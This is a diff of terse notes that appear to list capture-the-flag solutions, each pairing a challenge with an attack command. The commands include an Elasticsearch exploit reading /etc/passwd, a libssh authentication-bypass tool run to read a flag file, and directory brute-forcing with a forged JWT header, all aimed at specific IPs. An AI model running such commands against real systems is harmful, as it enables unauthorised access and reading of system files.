@@ -25,7 +25,7 @@
 
 
 10 elastic python exploit.py http://35.198.97.185:31763/ /etc/passwd
-11 libshh  https://github.com/nikhil1232/LibSSH-Authentication-Bypass
+11 libshh  https://github.com/nikhil1232/LibSSH-Authentication-Bypass  python3 LibAuth.py --host 34.40.24.84 -p 30908 -c "cat /flag.txt"
 
 12 authorization  dirsearch -u IP                     curl -X POST http://34.159.62.179:30798/auth             (aplikacia) ModHeader: Authorization        JWT   <TOKEM>
 
